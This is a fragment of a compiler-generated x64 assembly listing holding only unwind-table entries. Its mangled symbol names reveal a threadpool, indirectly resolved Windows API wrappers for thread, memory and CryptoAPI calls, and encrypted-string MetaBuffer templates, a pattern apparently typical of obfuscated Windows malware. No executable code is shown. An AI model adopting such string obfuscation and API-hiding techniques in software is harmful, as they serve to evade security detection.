$pdata$?_Get_first@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAAAEAV?$allocator@_W@2@XZ DD imagerel $LN3
	DD	imagerel $LN3+48
	DD	imagerel $unwind$?_Get_first@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAAAEAV?$allocator@_W@2@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Get_first@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEBAAEBV?$allocator@_W@2@XZ DD imagerel $LN3
	DD	imagerel $LN3+48
	DD	imagerel $unwind$?_Get_first@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEBAAEBV?$allocator@_W@2@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??1?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@XZ DD imagerel $LN3
	DD	imagerel $LN3+44
	DD	imagerel $unwind$??1?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?pCreateThread@@YAPEAXPEAU_SECURITY_ATTRIBUTES@@_KP6AKPEAX@Z2KPEAK@Z DD imagerel $LN3
	DD	imagerel $LN3+137
	DD	imagerel $unwind$?pCreateThread@@YAPEAXPEAU_SECURITY_ATTRIBUTES@@_KP6AKPEAX@Z2KPEAK@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?pEnterCriticalSection@@YAXPEAU_RTL_CRITICAL_SECTION@@@Z DD imagerel $LN3
	DD	imagerel $LN3+79
	DD	imagerel $unwind$?pEnterCriticalSection@@YAXPEAU_RTL_CRITICAL_SECTION@@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?pLeaveCriticalSection@@YAXPEAU_RTL_CRITICAL_SECTION@@@Z DD imagerel $LN3
	DD	imagerel $LN3+79
	DD	imagerel $unwind$?pLeaveCriticalSection@@YAXPEAU_RTL_CRITICAL_SECTION@@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?pInitializeCriticalSection@@YAXPEAU_RTL_CRITICAL_SECTION@@@Z DD imagerel $LN3
	DD	imagerel $LN3+79
	DD	imagerel $unwind$?pInitializeCriticalSection@@YAXPEAU_RTL_CRITICAL_SECTION@@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?pExitThread@@YAXK@Z DD imagerel $LN3
	DD	imagerel $LN3+77
	DD	imagerel $unwind$?pExitThread@@YAXK@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?pSleep@@YAXK@Z DD imagerel $LN3
	DD	imagerel $LN3+77
	DD	imagerel $unwind$?pSleep@@YAXK@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?pVirtualAlloc@@YAPEAXPEAX_KKK@Z DD imagerel $LN3
	DD	imagerel $LN3+115
	DD	imagerel $unwind$?pVirtualAlloc@@YAPEAXPEAX_KKK@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?pWaitForMultipleObjects@@YAKKPEBQEAXHK@Z DD imagerel $LN3
	DD	imagerel $LN3+113
	DD	imagerel $unwind$?pWaitForMultipleObjects@@YAKKPEBQEAXHK@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?pCryptImportKey@@YAH_KPEBEK0KPEA_K@Z DD imagerel $LN3
	DD	imagerel $LN3+137
	DD	imagerel $unwind$?pCryptImportKey@@YAH_KPEBEK0KPEA_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?pCryptAcquireContextA@@YAHPEA_KPEBD1KK@Z DD imagerel $LN3
	DD	imagerel $LN3+125
	DD	imagerel $unwind$?pCryptAcquireContextA@@YAHPEA_KPEBD1KK@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?Initialize@threadpool@@YAXXZ DD imagerel $LN3
	DD	imagerel $LN3+91
	DD	imagerel $unwind$?Initialize@threadpool@@YAXXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?Create@threadpool@@YAHH_K@Z DD imagerel $LN11
	DD	imagerel $LN11+222
	DD	imagerel $unwind$?Create@threadpool@@YAHH_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?Start@threadpool@@YAHH@Z DD imagerel $LN10
	DD	imagerel $LN10+201
	DD	imagerel $unwind$?Start@threadpool@@YAHH@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?PutTask@threadpool@@YAHHV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@@Z DD imagerel $LN13
	DD	imagerel $LN13+395
	DD	imagerel $unwind$?PutTask@threadpool@@YAHHV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?PutFinalTask@threadpool@@YAHH@Z DD imagerel $LN13
	DD	imagerel $LN13+293
	DD	imagerel $unwind$?PutFinalTask@threadpool@@YAHH@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?IsActive@threadpool@@YAHH@Z DD imagerel $LN7
	DD	imagerel $LN7+103
	DD	imagerel $unwind$?IsActive@threadpool@@YAHH@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?Wait@threadpool@@YAXH@Z DD imagerel $LN10
	DD	imagerel $LN10+173
	DD	imagerel $unwind$?Wait@threadpool@@YAXH@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?positive_modulo@@YAHHH@Z DD imagerel $LN3
	DD	imagerel $LN3+74
	DD	imagerel $unwind$?positive_modulo@@YAHHH@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0task_info_@@QEAA@XZ DD imagerel $LN3
	DD	imagerel $LN3+51
	DD	imagerel $unwind$??0task_info_@@QEAA@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?GetCryptoProvider@@YAHPEA_K@Z DD imagerel $LN6
	DD	imagerel $LN6+333
	DD	imagerel $unwind$?GetCryptoProvider@@YAHPEA_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0?$MetaBuffer@$0CP@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@QEAA@PEBE@Z DD imagerel $LN3
	DD	imagerel $LN3+2348
	DD	imagerel $unwind$??0?$MetaBuffer@$0CP@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@QEAA@PEBE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?isDecrypted@?$MetaBuffer@$0CP@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@QEBA_NXZ DD imagerel $LN3
	DD	imagerel $LN3+51
	DD	imagerel $unwind$?isDecrypted@?$MetaBuffer@$0CP@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@QEBA_NXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?decrypt@?$MetaBuffer@$0CP@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@QEAAPEBDXZ DD imagerel $LN7
	DD	imagerel $LN7+153
	DD	imagerel $unwind$?decrypt@?$MetaBuffer@$0CP@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@QEAAPEBDXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?encrypt@?$MetaBuffer@$0CP@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z DD imagerel $LN3
	DD	imagerel $LN3+68
	DD	imagerel $unwind$?encrypt@?$MetaBuffer@$0CP@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?decrypt@?$MetaBuffer@$0CP@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z DD imagerel $LN3
	DD	imagerel $LN3+70
	DD	imagerel $unwind$?decrypt@?$MetaBuffer@$0CP@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0?$MetaBuffer@$0N@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@QEAA@PEBE@Z DD imagerel $LN3
	DD	imagerel $LN3+2348
	DD	imagerel $unwind$??0?$MetaBuffer@$0N@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@QEAA@PEBE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?isDecrypted@?$MetaBuffer@$0N@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@QEBA_NXZ DD imagerel $LN3
	DD	imagerel $LN3+51
	DD	imagerel $unwind$?isDecrypted@?$MetaBuffer@$0N@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@QEBA_NXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?decrypt@?$MetaBuffer@$0N@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@QEAAPEBDXZ DD imagerel $LN7
	DD	imagerel $LN7+153
	DD	imagerel $unwind$?decrypt@?$MetaBuffer@$0N@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@QEAAPEBDXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?encrypt@?$MetaBuffer@$0N@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z DD imagerel $LN3
	DD	imagerel $LN3+68
	DD	imagerel $unwind$?encrypt@?$MetaBuffer@$0N@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?decrypt@?$MetaBuffer@$0N@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z DD imagerel $LN3
	DD	imagerel $LN3+70
	DD	imagerel $unwind$?decrypt@?$MetaBuffer@$0N@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0?$MetaBuffer@$01$0FJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@QEAA@PEBE@Z DD imagerel $LN3
	DD	imagerel $LN3+2852
	DD	imagerel $unwind$??0?$MetaBuffer@$01$0FJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@QEAA@PEBE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?isDecrypted@?$MetaBuffer@$01$0FJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@QEBA_NXZ DD imagerel $LN3
	DD	imagerel $LN3+51
	DD	imagerel $unwind$?isDecrypted@?$MetaBuffer@$01$0FJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@QEBA_NXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?decrypt@?$MetaBuffer@$01$0FJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@QEAAPEBDXZ DD imagerel $LN7
	DD	imagerel $LN7+153
	DD	imagerel $unwind$?decrypt@?$MetaBuffer@$01$0FJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@QEAAPEBDXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?encrypt@?$MetaBuffer@$01$0FJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z DD imagerel $LN3
	DD	imagerel $LN3+66
	DD	imagerel $unwind$?encrypt@?$MetaBuffer@$01$0FJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?decrypt@?$MetaBuffer@$01$0FJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z DD imagerel $LN3
	DD	imagerel $LN3+70
	DD	imagerel $unwind$?decrypt@?$MetaBuffer@$01$0FJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0?$MetaBuffer@$0CF@$0CK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@QEAA@PEBE@Z DD imagerel $LN3
	DD	imagerel $LN3+2852
	DD	imagerel $unwind$??0?$MetaBuffer@$0CF@$0CK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@QEAA@PEBE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?isDecrypted@?$MetaBuffer@$0CF@$0CK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@QEBA_NXZ DD imagerel $LN3
	DD	imagerel $LN3+51
